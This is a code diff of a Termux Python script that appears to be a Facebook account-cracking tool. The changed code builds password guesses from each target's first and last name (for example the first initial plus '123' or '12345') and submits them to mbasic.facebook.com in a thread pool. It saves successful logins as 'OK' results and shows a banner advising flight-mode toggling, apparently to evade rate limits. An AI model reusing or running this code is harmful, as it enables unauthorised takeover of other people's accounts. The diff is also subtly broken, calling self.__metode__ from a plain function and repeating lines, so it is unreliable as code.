@@ -84,9 +84,9 @@ def clear():
 def back():
 	login()
  
-Mrdevil="mrd-"
+ah = "KHD302-"
 imt="-brand=="
-ak="-pro"
+ak ="BRAND-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
@@ -272,23 +272,21 @@ def name():
 		for yuzong in id2:
 			try:
 				idf,nmf = yuzong.split('|')
-				frist,last = nmf.split(' ')[0],nmf.split(' ')[1]
-				if len(frist)>=6:
-					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-				elif len(frist)<=2:
-					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-				elif len(frist)<=3:
-					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+				xz = nmf.split(' ')[0]
+				first, last = nmf.split(' ')
+				firstl = first.lower()
+				lastl = last.lower()
+				firsts = first.capitalize()
+				lasts = last.capitalize()
+				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
 				else:
-					[ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
-				if 'mobile' in method:
-					pool.submit(crack,idf,pwv)
-				elif 'free' in method:
-					pool.submit(free,idf,pwv)
-				else:
-					pool.submit(crack,idf,pwv)
+					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+				pool.submit(self.__metode__, idf, pwv, "mbasic.facebook.com")
 			except:
 				pass
+	hasil(ok,cp)
 def name2():
 	clear()
 	print(logo);print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
@@ -916,7 +914,7 @@ def Subscraption():
 
 		print ("")
 
-		print(" \033[1;32m THIS JUST FOR RSU AND RSU FRIEDNS\033[1;37m\n")
+		print(" \033[1;32m THIS JUST FOR RSU AND LFG-007 JKR CKG\033[1;37m\n")
 
 		print ("")
 
